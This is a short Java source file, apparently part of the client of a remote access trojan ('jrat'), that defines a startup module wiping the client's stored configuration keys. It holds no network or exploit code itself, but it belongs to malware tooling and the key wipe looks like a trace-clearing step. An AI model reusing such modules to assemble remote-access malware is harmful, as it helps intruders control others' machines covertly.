package jrat.client.modules.startup;

import jrat.client.Configuration;

import java.util.Map;

public class KeyWiperStartupModule extends StartupModule {

	public KeyWiperStartupModule(Map<String, String> config) {
		super(config);
	}

	public void run() throws Exception {
		Configuration.wipeKeys();
	}

}
